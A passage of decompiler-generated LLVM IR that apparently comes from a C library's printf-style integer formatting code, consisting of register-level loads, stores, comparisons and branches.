  %v2_805fe08 = inttoptr i32 %v1_805fe08 to i8*
  %v3_805fe08 = load i8, i8* %v2_805fe08, align 1
  %v4_805fe08 = zext i8 %v3_805fe08 to i32
  store i32 %v4_805fe08, i32* @ebp, align 4
  %v1_805fe0d = add i32 %v0_805fe08, 16
  %v1_805fe10 = add i32 %v0_805fe08, 56
  %v2_805fe10 = inttoptr i32 %v1_805fe10 to i32*
  %v3_805fe10 = load i32, i32* %v2_805fe10, align 4
  %v5_805fe10 = icmp slt i32 %v3_805fe10, 0
  store i1 %v5_805fe10, i1* %sf.global-to-local, align 1
  %v1_805fe15 = add i32 %v0_805fe08, 112
  store i32 %v1_805fe15, i32* %edx.global-to-local, align 4
  %tmp65 = icmp slt i32 %v3_805fe10, 1
  br i1 %tmp65, label %dec_label_pc_805fe22, label %dec_label_pc_805fe1b

dec_label_pc_805fe1b:                             ; preds = %dec_label_pc_805fde1
  %v2_805fe1b = zext i8 %v3_805fe08 to i32
  %v3_805fe1b = mul nuw nsw i32 %v2_805fe1b, 12
  store i32 %v3_805fe1b, i32* %eax.global-to-local, align 4
  %v2_805fe1e = add i32 %v0_805fe08, 100
  %v3_805fe1e = add i32 %v2_805fe1e, %v3_805fe1b
  store i32 %v3_805fe1e, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805fe22

dec_label_pc_805fe22:                             ; preds = %dec_label_pc_805fde1, %dec_label_pc_805fe1b
  %v0_805fe2632 = phi i32 [ %v1_805fe15, %dec_label_pc_805fde1 ], [ %v3_805fe1e, %dec_label_pc_805fe1b ]
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_805fe3170 = add i32 %v0_805fe08, 60
  %v3_805fe3171 = inttoptr i32 %v2_805fe3170 to i32*
  %v4_805fe3172 = load i32, i32* %v3_805fe3171, align 4
  %v5_805fe3173 = sub i32 0, %v4_805fe3172
  %v13_805fe3176 = and i32 %v4_805fe3172, %v5_805fe3173
  %v14_805fe3177 = icmp slt i32 %v13_805fe3176, 0
  %v16_805fe3178 = icmp slt i32 %v5_805fe3173, 0
  %v2_805fe3579 = icmp eq i1 %v16_805fe3178, %v14_805fe3177
  br i1 %v2_805fe3579, label %dec_label_pc_805fe37, label %dec_label_pc_805fe26

dec_label_pc_805fe26:                             ; preds = %dec_label_pc_805fe22, %dec_label_pc_805fe26
  %v5_805fe6e82 = phi i32 [ %v1_805fe30, %dec_label_pc_805fe26 ], [ 0, %dec_label_pc_805fe22 ]
  %v0_805fec781 = phi i32 [ %v1_805fe31.pre, %dec_label_pc_805fe26 ], [ %v1_805fe0d, %dec_label_pc_805fe22 ]
  %v0_805fe2680 = phi i32 [ %v1_805fe2d, %dec_label_pc_805fe26 ], [ %v0_805fe2632, %dec_label_pc_805fe22 ]
  %v3_805fe26 = mul i32 %v5_805fe6e82, 4
  %v4_805fe26 = add i32 %v0_805fec781, 332
  %v5_805fe26 = add i32 %v4_805fe26, %v3_805fe26
  %v6_805fe26 = inttoptr i32 %v5_805fe26 to i32*
  store i32 %v0_805fe2680, i32* %v6_805fe26, align 4
  %v0_805fe2d = load i32, i32* %edx.global-to-local, align 4
  %v1_805fe2d = add i32 %v0_805fe2d, 12
  store i32 %v1_805fe2d, i32* %edx.global-to-local, align 4
  %v0_805fe30 = load i32, i32* %eax.global-to-local, align 4
  %v1_805fe30 = add i32 %v0_805fe30, 1
  %v1_805fe31.pre = load i32, i32* @esp, align 4
  store i32 %v1_805fe30, i32* %eax.global-to-local, align 4
  %v2_805fe31 = add i32 %v1_805fe31.pre, 44
  %v3_805fe31 = inttoptr i32 %v2_805fe31 to i32*
  %v4_805fe31 = load i32, i32* %v3_805fe31, align 4
  %v5_805fe31 = sub i32 %v1_805fe30, %v4_805fe31
  %v11_805fe31 = xor i32 %v4_805fe31, %v1_805fe30
  %v12_805fe31 = xor i32 %v5_805fe31, %v1_805fe30
  %v13_805fe31 = and i32 %v12_805fe31, %v11_805fe31
  %v14_805fe31 = icmp slt i32 %v13_805fe31, 0
  %v16_805fe31 = icmp slt i32 %v5_805fe31, 0
  %v2_805fe35 = icmp eq i1 %v16_805fe31, %v14_805fe31
  br i1 %v2_805fe35, label %dec_label_pc_805fe37, label %dec_label_pc_805fe26

dec_label_pc_805fe37:                             ; preds = %dec_label_pc_805fe26, %dec_label_pc_805fe22
  %v0_805fec7.lcssa = phi i32 [ %v1_805fe0d, %dec_label_pc_805fe22 ], [ %v1_805fe31.pre, %dec_label_pc_805fe26 ]
  %v5_805fe6e.lcssa = phi i32 [ 0, %dec_label_pc_805fe22 ], [ %v1_805fe30, %dec_label_pc_805fe26 ]
  %v1_805fe37 = add i32 %v0_805fec7.lcssa, 48
  %v2_805fe37 = inttoptr i32 %v1_805fe37 to i32*
  %v3_805fe37 = load i32, i32* %v2_805fe37, align 4
  store i32 %v3_805fe37, i32* @ecx, align 4
  %v1_805fe3b = icmp eq i32 %v3_805fe37, 0
  %v2_805fe3b = icmp slt i32 %v3_805fe37, 0
  store i1 %v2_805fe3b, i1* %sf.global-to-local, align 1
  %v1_805fe3d = icmp eq i1 %v1_805fe3b, false
  br i1 %v1_805fe3d, label %dec_label_pc_805fe65, label %dec_label_pc_805fe3f

dec_label_pc_805fe3f:                             ; preds = %dec_label_pc_805fe37
  %v1_805fe3f = inttoptr i32 %v0_805fec7.lcssa to i32*
  %v2_805fe3f = load i32, i32* %v1_805fe3f, align 4
  store i32 %v2_805fe3f, i32* %eax.global-to-local, align 4
  %v1_805fe42 = ashr i32 %v2_805fe3f, 31
  store i32 %v1_805fe42, i32* %edx.global-to-local, align 4
  %v2_805fe43 = add i32 %v0_805fec7.lcssa, -4
  %v3_805fe43 = inttoptr i32 %v2_805fe43 to i32*
  store i32 %v1_805fe42, i32* %v3_805fe43, align 4
  %v0_805fe44 = load i32, i32* %eax.global-to-local, align 4
  %v2_805fe44 = add i32 %v0_805fec7.lcssa, -8
  %v3_805fe44 = inttoptr i32 %v2_805fe44 to i32*
  store i32 %v0_805fe44, i32* %v3_805fe44, align 4
  %v1_805fe45 = add i32 %v0_805fec7.lcssa, 32
  %v2_805fe45 = inttoptr i32 %v1_805fe45 to i32*
  %v3_805fe45 = load i32, i32* %v2_805fe45, align 4
  %v1_805fe49 = and i32 %v3_805fe45, 3840
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 %v1_805fe49, i32* %eax.global-to-local, align 4
  %v2_805fe4e = add i32 %v0_805fec7.lcssa, -12
  %v3_805fe4e = inttoptr i32 %v2_805fe4e to i32*
  store i32 %v1_805fe49, i32* %v3_805fe4e, align 4
  %v1_805fe4f = add i32 %v0_805fec7.lcssa, 332
  %v2_805fe4f = inttoptr i32 %v1_805fe4f to i32*
  %v3_805fe4f = load i32, i32* %v2_805fe4f, align 4
  store i32 %v3_805fe4f, i32* %eax.global-to-local, align 4
  %v1_805fe56 = inttoptr i32 %v3_805fe4f to i32*
  %v2_805fe56 = load i32, i32* %v1_805fe56, align 4
  %v4_805fe56 = add i32 %v0_805fec7.lcssa, -16
  %v5_805fe56 = inttoptr i32 %v4_805fe56 to i32*
  store i32 %v2_805fe56, i32* %v5_805fe56, align 4
  %v0_805fe58 = call i32 @_store_inttype()
  store i32 %v0_805fe58, i32* %eax.global-to-local, align 4
  %v0_805fe5d = load i32, i32* @esp, align 4
  %v1_805fe5d = add i32 %v0_805fe5d, 16
  %v7_805fe5d = icmp slt i32 %v1_805fe5d, 0
  store i1 %v7_805fe5d, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_806030f

dec_label_pc_805fe65:                             ; preds = %dec_label_pc_805fe37
  %v1_805fe65 = add i32 %v3_805fe37, -7
  %v5_805fe65 = icmp ult i32 %v3_805fe37, 7
  %v9_805fe65 = icmp eq i32 %v1_805fe65, 0
  %v10_805fe65 = icmp slt i32 %v1_805fe65, 0
  store i1 %v10_805fe65, i1* %sf.global-to-local, align 1
  %v2_805fe68 = or i1 %v5_805fe65, %v9_805fe65
  br i1 %v2_805fe68, label %dec_label_pc_805fe6e, label %dec_label_pc_805ffcb

dec_label_pc_805fe6e:                             ; preds = %dec_label_pc_805fe65
  %v1_805fe6e = add i32 %v3_805fe37, 134672103
  %v2_805fe6e = inttoptr i32 %v1_805fe6e to i8*
  %v3_805fe6e = load i8, i8* %v2_805fe6e, align 1
  %v4_805fe6e = zext i8 %v3_805fe6e to i32
  %v6_805fe6e = and i32 %v5_805fe6e.lcssa, -256
  %v7_805fe6e = or i32 %v4_805fe6e, %v6_805fe6e
  store i32 %v7_805fe6e, i32* %eax.global-to-local, align 4
  store i32 87, i32* @ebx, align 4
  %v2_805fe79 = add i8 %v3_805fe6e, -10
  %v10_805fe79 = icmp eq i8 %v2_805fe79, 0
  %v11_805fe79 = icmp slt i8 %v2_805fe79, 0
  store i1 %v11_805fe79, i1* %sf.global-to-local, align 1
  store i32 %v4_805fe6e, i32* @esi, align 4
  %v1_805fe7e = icmp eq i1 %v10_805fe79, false
  br i1 %v1_805fe7e, label %dec_label_pc_805fe9e, label %dec_label_pc_805fe80

dec_label_pc_805fe80:                             ; preds = %dec_label_pc_805fe6e
  %v1_805fe80 = add i32 %v0_805fec7.lcssa, 32
  %v2_805fe80 = inttoptr i32 %v1_805fe80 to i32*
  %v3_805fe80 = load i32, i32* %v2_805fe80, align 4
  store i32 %v3_805fe80, i32* %eax.global-to-local, align 4
  %v1_805fe86 = udiv i32 %v3_805fe80, 32
  %tmp66 = urem i32 %v1_805fe86, 2
  %tmp67 = sub nsw i32 45, %tmp66
  %v2_805fe96 = or i32 %tmp67, 128
  store i32 %v2_805fe96, i32* %edx.global-to-local, align 4
  %v2_805fe99 = and i32 %v3_805fe80, 64
  %v3_805fe99 = icmp eq i32 %v2_805fe99, 0
  store i1 false, i1* %sf.global-to-local, align 1
  %v1_805fe9b = icmp eq i1 %v3_805fe99, false
  %v4_805fe9b = select i1 %v1_805fe9b, i32 %v2_805fe96, i32 %tmp67
  store i32 %v4_805fe9b, i32* @ebx, align 4
  br label %dec_label_pc_805fe9e

dec_label_pc_805fe9e:                             ; preds = %dec_label_pc_805fe6e, %dec_label_pc_805fe80
  %v1_805fe9e = add i32 %v3_805fe37, -5
  %v5_805fe9e = icmp ult i32 %v3_805fe37, 5
  %v9_805fe9e = icmp eq i32 %v1_805fe9e, 0
  %v10_805fe9e = icmp slt i32 %v1_805fe9e, 0
  store i1 %v10_805fe9e, i1* %sf.global-to-local, align 1
  %v2_805fea1 = or i1 %v5_805fe9e, %v9_805fe9e
  br i1 %v2_805fea1, label %dec_label_pc_805fea3, label %dec_label_pc_805febb

dec_label_pc_805fea3:                             ; preds = %dec_label_pc_805fe9e
  %v1_805fea3 = add i32 %v3_805fe37, -3
  %v9_805fea3 = icmp eq i32 %v1_805fea3, 0
  %v10_805fea3 = icmp slt i32 %v1_805fea3, 0
  store i1 %v10_805fea3, i1* %sf.global-to-local, align 1
  %v1_805fea6 = icmp eq i1 %v9_805fea3, false
  br i1 %v1_805fea6, label %dec_label_pc_805feaf, label %dec_label_pc_805fea8

dec_label_pc_805fea8:                             ; preds = %dec_label_pc_805fea3
  store i32 55, i32* @ebx, align 4
  br label %dec_label_pc_805febd

dec_label_pc_805feaf:                             ; preds = %dec_label_pc_805fea3
  %v1_805feaf = add i32 %v3_805fe37, -1
  %v9_805feaf = icmp eq i32 %v1_805feaf, 0
  %v10_805feaf = icmp slt i32 %v1_805feaf, 0
  store i1 %v10_805feaf, i1* %sf.global-to-local, align 1
  br i1 %v9_805feaf, label %dec_label_pc_805fec2, label %dec_label_pc_805febd

dec_label_pc_805febb:                             ; preds = %dec_label_pc_805fe9e
  %v1_805febb = sub nsw i32 0, %v4_805fe6e
  %v5_805febb = icmp ne i8 %v3_805fe6e, 0
  store i1 %v5_805febb, i1* %sf.global-to-local, align 1
  store i32 %v1_805febb, i32* @esi, align 4
  br label %dec_label_pc_805febd

dec_label_pc_805febd:                             ; preds = %dec_label_pc_805feaf, %dec_label_pc_805fea8, %dec_label_pc_805febb
  br label %dec_label_pc_805fec2

dec_label_pc_805fec2:                             ; preds = %dec_label_pc_805feaf, %dec_label_pc_805febd
  %storemerge = phi i32 [ 11, %dec_label_pc_805febd ], [ 6, %dec_label_pc_805feaf ]
  store i32 %storemerge, i32* @edi, align 4
  %v1_805fec2 = add i32 %v0_805fec7.lcssa, 20
  %v2_805fec2 = inttoptr i32 %v1_805fec2 to i32*
  %v3_805fec2 = load i32, i32* %v2_805fec2, align 4
  %v5_805fec2 = icmp slt i32 %v3_805fec2, 0
  store i1 %v5_805fec2, i1* %sf.global-to-local, align 1
  %v1_805fec7 = add i32 %v0_805fec7.lcssa, 7
  %v2_805fec7 = inttoptr i32 %v1_805fec7 to i8*
  store i8 32, i8* %v2_805fec7, align 1
  %v0_805fecc = load i1, i1* %sf.global-to-local, align 1
  %v1_805fecc = icmp eq i1 %v0_805fecc, false
  br i1 %v1_805fecc, label %dec_label_pc_805fed6, label %dec_label_pc_805fece

dec_label_pc_805fece:                             ; preds = %dec_label_pc_805fec2
  %v0_805fece = load i32, i32* @esp, align 4
  %v1_805fece = add i32 %v0_805fece, 36
  %v2_805fece = inttoptr i32 %v1_805fece to i8*
  %v3_805fece = load i8, i8* %v2_805fece, align 1
  %v4_805fece = zext i8 %v3_805fece to i32
  %v5_805fece = load i32, i32* %edx.global-to-local, align 4
  %v6_805fece = and i32 %v5_805fece, -256
  %v7_805fece = or i32 %v6_805fece, %v4_805fece
  store i32 %v7_805fece, i32* %edx.global-to-local, align 4
  %v3_805fed2 = add i32 %v0_805fece, 7
  %v4_805fed2 = inttoptr i32 %v3_805fed2 to i8*
  store i8 %v3_805fece, i8* %v4_805fed2, align 1
  br label %dec_label_pc_805fed6

dec_label_pc_805fed6:                             ; preds = %dec_label_pc_805fec2, %dec_label_pc_805fece
  %v1_805fed6 = add i32 %v3_805fe37, -1
  %v8_805fed6 = icmp eq i32 %v1_805fed6, 0
  %v9_805fed6 = icmp slt i32 %v1_805fed6, 0
  store i1 %v9_805fed6, i1* %sf.global-to-local, align 1
  %v0_805fed7 = load i32, i32* @esp, align 4
  %v1_805fed7 = add i32 %v0_805fed7, 332
  %v2_805fed7 = inttoptr i32 %v1_805fed7 to i32*
  %v3_805fed7 = load i32, i32* %v2_805fed7, align 4
  store i32 %v3_805fed7, i32* %eax.global-to-local, align 4
  store i32 1024, i32* %edx.global-to-local, align 4
  %v0_805feef.pre = load i32, i32* @ebp, align 4
  br i1 %v8_805fed6, label %dec_label_pc_805feef, label %dec_label_pc_805fee5

dec_label_pc_805fee5:                             ; preds = %dec_label_pc_805fed6
  %v2_805fee5 = mul i32 %v0_805feef.pre, 4
  %v3_805fee5 = add i32 %v0_805fed7, 52
  %v4_805fee5 = add i32 %v3_805fee5, %v2_805fee5
  %v5_805fee5 = inttoptr i32 %v4_805fee5 to i32*
  %v6_805fee5 = load i32, i32* %v5_805fee5, align 4
  %v1_805fee9 = and i32 %v6_805fee5, 3840
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 %v1_805fee9, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805feef

dec_label_pc_805feef:                             ; preds = %dec_label_pc_805fed6, %dec_label_pc_805fee5
  %v2_805feef = add i32 %v0_805fed7, -4
  %v3_805feef = inttoptr i32 %v2_805feef to i32*
  store i32 %v0_805feef.pre, i32* %v3_805feef, align 4
  %v0_805fef0 = load i32, i32* @esi, align 4
  %v2_805fef0 = add i32 %v0_805fed7, -8
  %v3_805fef0 = inttoptr i32 %v2_805fef0 to i32*
  store i32 %v0_805fef0, i32* %v3_805fef0, align 4
  %v0_805fef1 = load i32, i32* %eax.global-to-local, align 4
  %v2_805fef1 = add i32 %v0_805fed7, -12
  %v3_805fef1 = inttoptr i32 %v2_805fef1 to i32*
  store i32 %v0_805fef1, i32* %v3_805fef1, align 4
  %v0_805fef2 = load i32, i32* %edx.global-to-local, align 4
  %v2_805fef2 = add i32 %v0_805fed7, -16
  %v3_805fef2 = inttoptr i32 %v2_805fef2 to i32*
  store i32 %v0_805fef2, i32* %v3_805fef2, align 4
  %v0_805fef3 = call i32 @_load_inttype()
  %v0_805fef8 = load i32, i32* @ebx, align 4
  %v1_805fef8 = load i32, i32* @esp, align 4
  %v2_805fef8 = inttoptr i32 %v1_805fef8 to i32*
  store i32 %v0_805fef8, i32* %v2_805fef8, align 4
  %v0_805fefb = load i32, i32* @esi, align 4
  %v1_805fefb = load i32, i32* @esp, align 4
  %v2_805fefb = add i32 %v1_805fefb, -4
  %v3_805fefb = inttoptr i32 %v2_805fefb to i32*
  store i32 %v0_805fefb, i32* %v3_805fefb, align 4
  %v0_805fefc = load i32, i32* @edx, align 4
  %v2_805fefc = add i32 %v1_805fefb, -8
  %v3_805fefc = inttoptr i32 %v2_805fefc to i32*
  store i32 %v0_805fefc, i32* %v3_805fefc, align 4
  %v2_805fefd = add i32 %v1_805fefb, -12
  %v3_805fefd = inttoptr i32 %v2_805fefd to i32*
  store i32 %v0_805fef3, i32* %v3_805fefd, align 4
  %v1_805fefe = add i32 %v1_805fefb, 347
  store i32 %v1_805fefe, i32* %eax.global-to-local, align 4
  %v2_805ff05 = add i32 %v1_805fefb, -16
  %v3_805ff05 = inttoptr i32 %v2_805ff05 to i32*
  store i32 %v1_805fefe, i32* %v3_805ff05, align 4
  %v0_805ff06 = load i32, i32* %stack_var_-380, align 4
  %v5_805ff06 = inttoptr i32 %v0_805ff06 to i8*
  %v6_805ff06 = call i32 @_uintmaxtostr(i8* %v5_805ff06, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_805ff06, i32* %eax.global-to-local, align 4
  %v0_805ff0b = load i32, i32* @esp, align 4
  %v1_805ff0b = add i32 %v0_805ff0b, 32
  %v1_805ff0e = add i32 %v0_805ff0b, 80
  %v2_805ff0e = inttoptr i32 %v1_805ff0e to i32*
  %v3_805ff0e = load i32, i32* %v2_805ff0e, align 4
  %v4_805ff0e = add i32 %v3_805ff0e, -5
  %v8_805ff0e = icmp ult i32 %v3_805ff0e, 5
  %v12_805ff0e = icmp eq i32 %v4_805ff0e, 0
  %v13_805ff0e = icmp slt i32 %v4_805ff0e, 0
  store i1 %v13_805ff0e, i1* %sf.global-to-local, align 1
  store i32 %v6_805ff06, i32* @ebx, align 4
  %v2_805ff15 = or i1 %v8_805ff0e, %v12_805ff0e
  br i1 %v2_805ff15, label %dec_label_pc_805ff3f, label %dec_label_pc_805ff17

dec_label_pc_805ff17:                             ; preds = %dec_label_pc_805feef
  %v1_805ff17 = inttoptr i32 %v6_805ff06 to i8*
  %v2_805ff17 = load i8, i8* %v1_805ff17, align 1
  %v3_805ff17 = add i8 %v2_805ff17, -45
  %v11_805ff17 = icmp eq i8 %v3_805ff17, 0
  %v12_805ff17 = icmp slt i8 %v3_805ff17, 0
  store i1 %v12_805ff17, i1* %sf.global-to-local, align 1
  %v1_805ff1a = icmp eq i1 %v11_805ff17, false
  %v1_805ff29 = add i32 %v0_805ff0b, 64
  %v2_805ff29 = inttoptr i32 %v1_805ff29 to i32*
  %v3_805ff29 = load i32, i32* %v2_805ff29, align 4
  br i1 %v1_805ff1a, label %dec_label_pc_805ff29, label %dec_label_pc_805ff1c

dec_label_pc_805ff1c:                             ; preds = %dec_label_pc_805ff17
  %v4_805ff1c = or i32 %v3_805ff29, 2
  store i32 %v4_805ff1c, i32* %v2_805ff29, align 4
  %v0_805ff21 = load i32, i32* @ebx, align 4
  %v1_805ff21 = add i32 %v0_805ff21, 1
  %v9_805ff21 = icmp slt i32 %v1_805ff21, 0
  store i1 %v9_805ff21, i1* %sf.global-to-local, align 1
  store i32 %v1_805ff21, i32* @ebx, align 4
  store i32 2, i32* @edi, align 4
  %v0_805ff3f.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805ff3f

dec_label_pc_805ff29:                             ; preds = %dec_label_pc_805ff17
  store i32 %v3_805ff29, i32* %eax.global-to-local, align 4
  %v2_805ff2d = and i32 %v3_805ff29, 2
  %v3_805ff2d = icmp eq i32 %v2_805ff2d, 0
  store i1 false, i1* %sf.global-to-local, align 1
  br i1 %v3_805ff2d, label %dec_label_pc_805ff35, label %dec_label_pc_805ff31

dec_label_pc_805ff31:                             ; preds = %dec_label_pc_805ff29
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_805ff3f

dec_label_pc_805ff35:                             ; preds = %dec_label_pc_805ff29
  %v2_805ff35 = urem i32 %v3_805ff29, 2
  %v3_805ff35 = icmp eq i32 %v2_805ff35, 0
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 4, i32* %eax.global-to-local, align 4
  %v1_805ff3c = icmp eq i1 %v3_805ff35, false
  %v2_805ff3c = load i32, i32* @edi, align 4
  %v4_805ff3c = select i1 %v1_805ff3c, i32 4, i32 %v2_805ff3c
  store i32 %v4_805ff3c, i32* @edi, align 4
  br label %dec_label_pc_805ff3f

dec_label_pc_805ff3f:                             ; preds = %dec_label_pc_805feef, %dec_label_pc_805ff31, %dec_label_pc_805ff1c, %dec_label_pc_805ff35
  %v0_805ff8c = phi i32 [ %v6_805ff06, %dec_label_pc_805feef ], [ %v6_805ff06, %dec_label_pc_805ff31 ], [ %v1_805ff21, %dec_label_pc_805ff1c ], [ %v6_805ff06, %dec_label_pc_805ff35 ]
  %v0_805ff9c = phi i32 [ %v1_805ff0b, %dec_label_pc_805feef ], [ %v1_805ff0b, %dec_label_pc_805ff31 ], [ %v0_805ff3f.pre, %dec_label_pc_805ff1c ], [ %v1_805ff0b, %dec_label_pc_805ff35 ]
  %v1_805ff3f = add i32 %v0_805ff9c, 20
  %v2_805ff3f = inttoptr i32 %v1_805ff3f to i32*
  %v3_805ff3f = load i32, i32* %v2_805ff3f, align 4
  %v1_805ff43 = sub i32 331, %v0_805ff8c
  %v2_805ff4f = add i32 %v1_805ff43, %v0_805ff9c
  store i32 %v2_805ff4f, i32* @esi, align 4
  %v2_805ff51 = icmp slt i32 %v3_805ff3f, 0
  store i1 %v2_805ff51, i1* %sf.global-to-local, align 1
  %v3_805ff53 = select i1 %v2_805ff51, i32 1, i32 %v3_805ff3f
  %v1_805ff56 = add i32 %v0_805ff9c, 32
  %v2_805ff56 = inttoptr i32 %v1_805ff56 to i8*
  %v3_805ff56 = load i8, i8* %v2_805ff56, align 1
  %v4_805ff56 = and i8 %v3_805ff56, 16
  %v5_805ff56 = icmp eq i8 %v4_805ff56, 0
  store i1 false, i1* %sf.global-to-local, align 1
  br i1 %v5_805ff56, label %dec_label_pc_805ff8c, label %dec_label_pc_805ff5d

dec_label_pc_805ff5d:                             ; preds = %dec_label_pc_805ff3f
  %v1_805ff5d = add i32 %v0_805ff9c, 48
  %v2_805ff5d = inttoptr i32 %v1_805ff5d to i32*
  %v3_805ff5d = load i32, i32* %v2_805ff5d, align 4
  store i32 %v3_805ff5d, i32* %edx.global-to-local, align 4
  store i32 6, i32* %eax.global-to-local, align 4
  %tmp68 = icmp ult i32 %v3_805ff5d, 3
  %v3_805ff69 = load i32, i32* @edi, align 4
  %v5_805ff69 = select i1 %tmp68, i32 6, i32 %v3_805ff69
  store i32 %v5_805ff69, i32* @edi, align 4
  %v1_805ff6c = add i32 %v3_805ff5d, -3
  %v9_805ff6c = icmp eq i32 %v1_805ff6c, 0
  %v10_805ff6c = icmp slt i32 %v1_805ff6c, 0
  store i1 %v10_805ff6c, i1* %sf.global-to-local, align 1
  %v1_805ff6f = icmp eq i1 %v9_805ff6c, false
  br i1 %v1_805ff6f, label %dec_label_pc_805ff78, label %dec_label_pc_805ff71

dec_label_pc_805ff71:                             ; preds = %dec_label_pc_805ff5d
  store i32 9, i32* @edi, align 4
  br label %dec_label_pc_805ff8c

dec_label_pc_805ff78:                             ; preds = %dec_label_pc_805ff5d
  %v1_805ff78 = add i32 %v3_805ff5d, -4
  %v9_805ff78 = icmp eq i32 %v1_805ff78, 0
  %v10_805ff78 = icmp slt i32 %v1_805ff78, 0
  store i1 %v10_805ff78, i1* %sf.global-to-local, align 1
  %v1_805ff7b = icmp eq i1 %v9_805ff78, false
  br i1 %v1_805ff7b, label %dec_label_pc_805ff8c, label %dec_label_pc_805ff7d

dec_label_pc_805ff7d:                             ; preds = %dec_label_pc_805ff78
  %v2_805ff7d = sub i32 %v3_805ff53, %v2_805ff4f
  %v7_805ff7d = icmp ult i32 %v3_805ff53, %v2_805ff4f
  %v12_805ff7d = icmp eq i32 %v2_805ff7d, 0
  %v13_805ff7d = icmp slt i32 %v2_805ff7d, 0
  store i1 %v13_805ff7d, i1* %sf.global-to-local, align 1
  %v2_805ff7f = or i1 %v7_805ff7d, %v12_805ff7d
  br i1 %v2_805ff7f, label %dec_label_pc_805ff81, label %dec_label_pc_805ff8c

dec_label_pc_805ff81:                             ; preds = %dec_label_pc_805ff7d
  %v1_805ff81 = inttoptr i32 %v0_805ff8c to i8*
  %v2_805ff81 = load i8, i8* %v1_805ff81, align 1
  %v3_805ff81 = add i8 %v2_805ff81, -48
  %v8_805ff81 = icmp eq i8 %v3_805ff81, 0
  %v9_805ff81 = icmp slt i8 %v3_805ff81, 0
  store i1 %v9_805ff81, i1* %sf.global-to-local, align 1
  %v1_805ff86 = add i32 %v2_805ff4f, 1
  store i32 %v1_805ff86, i32* %eax.global-to-local, align 4
  %v1_805ff89 = icmp eq i1 %v8_805ff81, false
  %v4_805ff89 = select i1 %v1_805ff89, i32 %v1_805ff86, i32 1
  br label %dec_label_pc_805ff8c

dec_label_pc_805ff8c:                             ; preds = %dec_label_pc_805ff7d, %dec_label_pc_805ff78, %dec_label_pc_805ff3f, %dec_label_pc_805ff71, %dec_label_pc_805ff81
  %v0_805ffc2 = phi i32 [ %v3_805ff53, %dec_label_pc_805ff7d ], [ %v3_805ff53, %dec_label_pc_805ff78 ], [ %v3_805ff53, %dec_label_pc_805ff3f ], [ %v3_805ff53, %dec_label_pc_805ff71 ], [ %v4_805ff89, %dec_label_pc_805ff81 ]
  %v1_805ff8c = inttoptr i32 %v0_805ff8c to i8*
  %v2_805ff8c = load i8, i8* %v1_805ff8c, align 1
  %v3_805ff8c = add i8 %v2_805ff8c, -48
  %v8_805ff8c = icmp eq i8 %v3_805ff8c, 0
  %v9_805ff8c = icmp slt i8 %v3_805ff8c, 0
  store i1 %v9_805ff8c, i1* %sf.global-to-local, align 1
  %v1_805ff8f = icmp eq i1 %v8_805ff8c, false
  br i1 %v1_805ff8f, label %dec_label_pc_805ffb7, label %dec_label_pc_805ff91

dec_label_pc_805ff91:                             ; preds = %dec_label_pc_805ff8c
  %v0_805ff91 = load i32, i32* @edi, align 4
  %v1_805ff91 = add i32 %v0_805ff91, -6
  %v6_805ff91 = sub i32 5, %v0_805ff91
  %v7_805ff91 = and i32 %v6_805ff91, %v0_805ff91
  %v8_805ff91 = icmp slt i32 %v7_805ff91, 0
  %v10_805ff91 = icmp slt i32 %v1_805ff91, 0
  store i32 11, i32* %eax.global-to-local, align 4
  %v2_805ff99 = icmp eq i1 %v10_805ff91, %v8_805ff91
  %v5_805ff99 = select i1 %v2_805ff99, i32 11, i32 %v0_805ff91
  store i32 %v5_805ff99, i32* @edi, align 4
  %v1_805ff9c = add i32 %v0_805ff9c, 48
  %v2_805ff9c = inttoptr i32 %v1_805ff9c to i32*
  %v3_805ff9c = load i32, i32* %v2_805ff9c, align 4
  %v4_805ff9c = add i32 %v3_805ff9c, -1
  %v12_805ff9c = icmp eq i32 %v4_805ff9c, 0
  %v13_805ff9c = icmp slt i32 %v4_805ff9c, 0
  store i1 %v13_805ff9c, i1* %sf.global-to-local, align 1
  %v1_805ffa1 = icmp eq i1 %v12_805ff9c, false
  br i1 %v1_805ffa1, label %dec_label_pc_805ffaf, label %dec_label_pc_805ffa3

dec_label_pc_805ffa3:                             ; preds = %dec_label_pc_805ff91
  store i32 5, i32* @esi, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_806eecc.1570 to i32), i32* @ebx, align 4
  br label %dec_label_pc_805ffbb

dec_label_pc_805ffaf:                             ; preds = %dec_label_pc_805ff91
  %v1_805ffaf = icmp eq i32 %v0_805ffc2, 0
  %v2_805ffaf = icmp slt i32 %v0_805ffc2, 0
  store i1 %v2_805ffaf, i1* %sf.global-to-local, align 1
  %v1_805ffb1 = icmp eq i1 %v1_805ffaf, false
  br i1 %v1_805ffb1, label %dec_label_pc_805ffb7, label %dec_label_pc_805ffb3

dec_label_pc_805ffb3:                             ; preds = %dec_label_pc_805ffaf
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_805ffbb

dec_label_pc_805ffb7:                             ; preds = %dec_label_pc_805ffaf, %dec_label_pc_805ff8c
  %v2_805ffb7 = sub i32 %v0_805ffc2, %v2_805ff4f
  %v7_805ffb7 = icmp ult i32 %v0_805ffc2, %v2_805ff4f
  %v12_805ffb7 = icmp eq i32 %v2_805ffb7, 0
  %v13_805ffb7 = icmp slt i32 %v2_805ffb7, 0
  store i1 %v13_805ffb7, i1* %sf.global-to-local, align 1
  %v2_805ffb9 = or i1 %v7_805ffb7, %v12_805ffb7
  br i1 %v2_805ffb9, label %dec_label_pc_805ffbb, label %dec_label_pc_805ffc2

dec_label_pc_805ffbb:                             ; preds = %dec_label_pc_805ffb7, %dec_label_pc_805ffb3, %dec_label_pc_805ffa3
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_80601b9

dec_label_pc_805ffc2:                             ; preds = %dec_label_pc_805ffb7
  store i1 %v13_805ffb7, i1* %sf.global-to-local, align 1
